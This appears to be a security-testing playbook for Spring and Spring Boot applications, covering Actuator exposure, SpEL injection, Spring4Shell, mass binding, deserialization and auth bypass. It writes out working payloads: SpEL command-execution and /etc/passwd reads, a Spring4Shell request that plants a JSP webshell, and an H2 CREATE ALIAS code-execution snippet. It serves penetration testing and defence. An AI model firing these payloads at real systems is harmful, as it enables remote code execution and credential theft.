---
name: spring
description: Security testing playbook for Spring and Spring Boot applications covering SpEL injection, Actuator exposure, Java deserialization, and binding vulnerabilities
---

# Spring / Spring Boot

Security testing for Spring Framework and Spring Boot applications. Focus on SpEL injection, Actuator endpoint exposure, Java deserialization, mass binding via `@ModelAttribute`, Spring Security misconfiguration, and the Spring4Shell class of classloader binding attacks.

## Attack Surface

**Core Components**
- Controllers: `@Controller`, `@RestController`, `@RequestMapping`, `@ModelAttribute`
- Security: Spring Security filter chain, `@PreAuthorize`, `@Secured`, `@RolesAllowed`
- Data binding: `@ModelAttribute`, `@RequestBody`, `@RequestParam`, `WebDataBinder`
- Expression Language: SpEL in annotations, XML config, error messages, view resolution

**Spring Boot**
- Auto-configuration: Actuator, H2 console, DevTools, embedded Tomcat/Jetty/Undertow
- Actuator endpoints: `/actuator/*` — health, env, heapdump, mappings, beans, configprops
- Properties: `application.properties`/`application.yml`, profiles, environment variables

**Data Layer**
- Spring Data JPA: repositories, `@Query` (JPQL/native), Specification, QueryDSL
- JDBC Template: `query()`, `update()` with string concatenation
- Spring Data REST: auto-exposed repositories at `/api/*`

**Deployment**
- Embedded server or WAR on Tomcat/JBoss/WebLogic
- Spring Cloud Gateway, Zuul proxies
- Docker/Kubernetes with externalized config

## High-Value Targets

- Actuator endpoints accessible without authentication (`/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`)
- H2 console (`/h2-console`) if embedded and accessible
- Endpoints using `@ModelAttribute` with domain objects (mass binding)
- Controllers with SpEL in `@Value`, `@PreAuthorize`, or error messages
- Spring Data REST auto-exposed repositories (IDOR, unauthorized CRUD)
- File upload/download endpoints, report generators
- OAuth2/OIDC endpoints, token introspection, JWKS endpoints
- DevTools remote endpoint (`/restart`, `/.~~spring-boot!~`) if present

## Reconnaissance

**Fingerprinting**
```
curl -sI https://target/
# Set-Cookie: JSESSIONID=...  (Tomcat/Spring session)
# X-Application-Context: application  (Spring Boot, if not disabled)

curl -s https://target/error
# Whitelabel Error Page: "There was an unexpected error (type=Not Found, status=404)"
# This is Spring Boot's default error page — confirms the framework

curl -s https://target/nonexistent
# Spring MVC: 404 with Whitelabel or custom error; Tomcat default 404 page
```

**Actuator Discovery**
```
GET /actuator             # index of exposed endpoints
GET /actuator/env         # all environment properties (may contain secrets)
GET /actuator/configprops # configuration properties with values
GET /actuator/mappings    # all request mappings (full attack surface map)
GET /actuator/heapdump    # JVM heap dump (contains in-memory secrets, sessions, credentials)
GET /actuator/beans       # all Spring beans (architecture map)
GET /actuator/health      # health status with details
GET /actuator/info        # build info, git commit
GET /actuator/loggers     # loggers — POST to change log level at runtime
GET /actuator/threaddump  # thread state
GET /actuator/metrics     # application metrics
GET /manage/              # alternate actuator prefix (common in older configs)
```

`/actuator/env` frequently leaks database credentials, API keys, and `SECRET_KEY` values. `/actuator/heapdump` yields a full JVM heap — search it offline for credentials, session tokens, and encryption keys.

## Key Vulnerabilities

### Spring Expression Language (SpEL) Injection

SpEL is Spring's expression language, evaluated at runtime. When user input reaches SpEL evaluation, it executes arbitrary Java code.

**Common injection points**
- `@Value("#{${user.input}}")` with externalized properties
- `@PreAuthorize("hasRole(#role)")` where `#role` is user-controlled
- Error messages, validation messages with SpEL resolution
- Spring Cloud Gateway predicates and filters
- Spring Data `@Query` with SpEL expressions

**Detection and exploitation**
```
${7*7}    → 49 (property placeholder — limited)
#{7*7}    → 49 (SpEL expression — full Java access)

# RCE via Runtime
#{T(java.lang.Runtime).getRuntime().exec('id')}

# RCE via ProcessBuilder
#{new java.lang.ProcessBuilder(new java.util.ArrayList({'id'})).start()}

# Read file
#{T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/etc/passwd'))}
```

Cross-ref: `ssti` for expression language injection across frameworks; `rce` for Java-specific post-exploitation.

### Actuator Exposure

Unprotected Actuator endpoints are the most common Spring Boot finding — they leak configuration, credentials, and provide RCE paths.

**Critical endpoints**
- `/actuator/env` — POST to set properties at runtime: can inject `spring.datasource.url` for JNDI injection, or `eureka.client.serviceUrl.defaultZone` for SSRF/RCE via Eureka XStream deserialization.
- `/actuator/heapdump` — download and search with `strings` or Eclipse MAT for passwords, tokens, `secret_key_base`.
- `/actuator/gateway/routes` (Spring Cloud Gateway) — POST to add routes with SpEL filters → RCE.
- `/actuator/loggers` — POST to change log level, enabling verbose logging that may expose secrets or enable log injection.

**Exploitation chain**: `/actuator/env` POST (set malicious property) → `/actuator/restart` or `/actuator/refresh` (trigger reload) → RCE.

Cross-ref: `information_disclosure` for configuration/secret leakage; `ssrf` for JNDI/Eureka exploitation chains.

### Spring4Shell (CVE-2022-22965)

RCE via data binding on JDK 9+ where `class.module.classLoader` is accessible through the Java module system. Affected Spring Framework 5.3.x < 5.3.18 and 5.2.x < 5.2.20 on JDK 9+, most commonly exploited on Tomcat WAR deployments.

**Mechanism**: Spring's data binder allows setting nested properties via request parameters. On JDK 9+, `class.module.classLoader` exposes Tomcat's `AccessLogValve`, enabling writing a JSP webshell to the web root.

```
POST /endpoint HTTP/1.1
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...%7D
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**Detection**: send `class.module.classLoader.DefaultAssertionStatus=nonsense` — a 400 error indicates the binding path is accessible; a clean response suggests the fix is applied.

### Mass Binding

`@ModelAttribute` binds all request parameters to object fields by default — including fields the developer didn't intend to expose.

```java
// Vulnerable: binds all matching params to User fields
@PostMapping("/register")
public String register(@ModelAttribute User user) { ... }
// POST: username=test&password=test&role=ADMIN&enabled=true
```

`WebDataBinder.setAllowedFields()` or `setDisallowedFields()` restricts binding, but the default is permissive. Test every `@ModelAttribute` endpoint with unexpected fields: `role`, `isAdmin`, `enabled`, `balance`, `verified`, `id`.

Cross-ref: `mass_assignment` for automated parameter discovery and escalation patterns.

### Java Deserialization

Spring applications using Java serialization (ObjectInputStream, RMI, JMX, HTTP invoker) are vulnerable to deserialization attacks with gadget chains (ysoserial).

**Common entry points**
- Spring HTTP Invoker (`RemoteInvocationSerializingExporter`)
- JMX over RMI
- Custom endpoints accepting `application/x-java-serialized-object`
- ViewState in Spring WebFlow (if JSF-backed)
- Redis/Memcached session stores using Java serialization

**Detection**: send a serialized payload — look for `Content-Type: application/x-java-serialized-object` in requests/responses, `rO0AB` (base64 Java serialized magic), or `aced0005` (hex).

Cross-ref: `insecure_deserialization` for ysoserial usage and Java gadget chain selection.

### Spring Security Misconfiguration

**Common gaps**
- `permitAll()` on sensitive endpoints or overly broad URL patterns
- Method-level security (`@PreAuthorize`) missing on specific controller methods
- `httpSecurity.authorizeRequests()` rules order: first match wins — a broad `permitAll()` before a restrictive rule wins
- CSRF disabled globally (`csrf().disable()`) instead of per-endpoint
- Session fixation: `sessionManagement().sessionFixation().none()` instead of `.migrateSession()`

**Path matching differences**: Spring Security and Spring MVC may normalize paths differently — trailing slashes, double slashes, URL-encoded characters, and case sensitivity can cause the security filter to see a different path than the controller.

Cross-ref: `authentication_jwt` for JWT/OAuth2 configuration weaknesses.

### H2 Console

Spring Boot's embedded H2 database console (`/h2-console`, enabled via `spring.h2.console.enabled=true`) provides a web-based SQL interface. If accessible:
- Execute arbitrary SQL, read/write database
- RCE via `CREATE ALIAS` + Java code execution:
```sql
CREATE ALIAS EXEC AS 'String exec(String cmd) throws Exception { return Runtime.getRuntime().exec(cmd).toString(); }';
CALL EXEC('id');
```

### SSRF

- `RestTemplate`, `WebClient`, `Feign` clients fetching user-supplied URLs
- Spring Cloud Gateway route definitions with user-controlled targets
- Actuator `/env` POST for JNDI/Eureka injection → internal service access

Cross-ref: `ssrf` for SSRF payloads and cloud metadata endpoints.

## Bypass Techniques

- Path normalization: `/admin` vs `/admin/` vs `/admin;jsessionid=` vs `//admin` — Spring Security vs Spring MVC path matching
- Semicolon path parameters: `/admin;bypass=true` — Tomcat strips path parameters, but Spring Security may evaluate the full path
- URL encoding: `%2e%2e` for path traversal through Spring Security's path matching
- Method override: Spring supports `HiddenHttpMethodFilter` (`_method` parameter) — test DELETE/PUT via POST
- Content-type switching: `application/json` vs `application/x-www-form-urlencoded` hitting different `@ModelAttribute` vs `@RequestBody` binding

## Testing Methodology

1. **Fingerprint** — Identify Spring Boot via Whitelabel Error Page, `JSESSIONID`, `X-Application-Context`
2. **Actuator scan** — Enumerate `/actuator/*`, `/manage/*` endpoints; check auth requirements on each
3. **Mapping review** — Use `/actuator/mappings` to map all controllers, handlers, and security filters
4. **Mass binding** — Test all `@ModelAttribute` endpoints with unexpected privilege/role parameters
5. **SpEL probing** — Inject `#{7*7}` and `${7*7}` in all input fields, headers, and error-triggering inputs
6. **Auth matrix** — Test each endpoint across unauthenticated, user, and admin with path normalization variants
7. **Deserialization** — Check for Java serialization endpoints and attempt ysoserial gadget chain payloads
8. **Spring4Shell** — On JDK 9+ Tomcat WAR deployments, test `class.module.classLoader` binding

## Validation Requirements

- Actuator leakage: captured credentials, keys, or session tokens from `/actuator/env` or `/actuator/heapdump`
- SpEL injection: expression evaluation (`#{7*7}`→`49`) or command execution output
- Spring4Shell: webshell written to disk and accessible, or binding path confirmed accessible
- Mass binding: privilege field (`role`, `isAdmin`) modified via unexpected parameter
- Deserialization: gadget chain execution confirmed via command output or DNS/HTTP callback
- Auth bypass: path normalization variant accessing protected endpoint (show security filter vs controller path mismatch)
- H2 console: SQL execution or RCE via `CREATE ALIAS` on exposed console
